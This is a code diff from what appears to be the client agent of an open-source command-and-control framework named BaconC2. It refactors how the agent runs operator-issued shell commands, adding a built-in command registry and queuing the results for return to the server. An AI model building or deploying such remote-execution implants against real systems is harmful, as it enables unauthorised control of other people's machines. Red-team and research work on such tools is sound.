@@ -7,28 +7,40 @@ import (
 	"runtime"
 	"time"
 
+	"github.com/RabbITCybErSeC/BaconC2/client/config"
+	"github.com/RabbITCybErSeC/BaconC2/client/core/commands"
 	"github.com/RabbITCybErSeC/BaconC2/client/models"
 	"github.com/RabbITCybErSeC/BaconC2/client/queue"
 )
 
 type DefaultCommandExecutor struct {
-	queue     queue.CommandQueue
-	transport models.ITransportProtocol
-	agentID   string
+	queue           queue.ICommandQueue
+	resultsQueue    queue.IResultQueue
+	transport       models.ITransportProtocol
+	config          *config.AgentConfig
+	commandRegistry *commands.CommandHandlerRegistry
 }
 
-func NewDefaultCommandExecutor(queue queue.CommandQueue, transport models.ITransportProtocol, agentID string) models.ICommandExecutor {
+func NewDefaultCommandExecutor(queue queue.ICommandQueue, resultsQueue queue.IResultQueue, transport models.ITransportProtocol, cfg *config.AgentConfig) models.ICommandExecutor {
+	registry := commands.NewCommandHandlerRegistry()
+	commands.RegisterBuiltInCommands(registry, resultsQueue, transport)
 	return &DefaultCommandExecutor{
-		queue:     queue,
-		transport: transport,
-		agentID:   agentID,
+		queue:           queue,
+		resultsQueue:    resultsQueue,
+		transport:       transport,
+		config:          cfg,
+		commandRegistry: registry,
 	}
 }
 
-func (e *DefaultCommandExecutor) Execute(cmd models.Command) models.Command {
-	result := models.Command{
-		ID:      cmd.ID,
-		Command: cmd.Command,
+func (e *DefaultCommandExecutor) Execute(cmd models.Command) models.CommandResult {
+	// Check for built-in commands
+	if handler, exists := e.commandRegistry.GetHandler(cmd.Command); exists {
+		return handler(cmd)
+	}
+
+	result := models.CommandResult{
+		ID: cmd.ID,
 	}
 
 	var execCmd *exec.Cmd
@@ -43,12 +55,22 @@ func (e *DefaultCommandExecutor) Execute(cmd models.Command) models.Command {
 	execCmd.Stderr = &stderr
 
 	err := execCmd.Run()
+	var output interface{}
 	if err != nil {
 		result.Status = "error"
-		result.Output = stderr.String()
+		output = map[string]string{"error": stderr.String()}
 	} else {
 		result.Status = "success"
-		result.Output = stdout.String()
+		output = map[string]string{"output": stdout.String()}
+	}
+
+	result.Output = output
+
+	// Queue the result
+	if err := e.resultsQueue.Add(result); err != nil {
+		fmt.Printf("Error queuing result for command %s: %v\n", cmd.ID, err)
+		result.Status = "error"
+		result.Output = map[string]string{"error": fmt.Sprintf("Failed to queue result: %v", err)}
 	}
 
 	return result
@@ -65,13 +87,10 @@ func (e *DefaultCommandExecutor) ProcessCommandQueue() {
 		// Execute the command
 		result := e.Execute(cmd)
 
-		// Send the result back to the server
-		if err := e.transport.SendResult(e.agentID, result); err != nil {
-			fmt.Printf("Error sending result for command %s: %v\n", cmd.ID, err)
-			// Re-queue the command on failure
-			if err := e.queue.Add(cmd); err != nil {
-				fmt.Printf("Error re-queuing command %s: %v\n", cmd.ID, err)
-			}
+		if result.Status == "error" {
+			fmt.Printf("Command %s failed: %s\n", cmd.ID, result.Output)
+		} else {
+			fmt.Printf("Command %s queued result\n", cmd.ID)
 		}
 
 		time.Sleep(100 * time.Millisecond) // Prevent tight loop
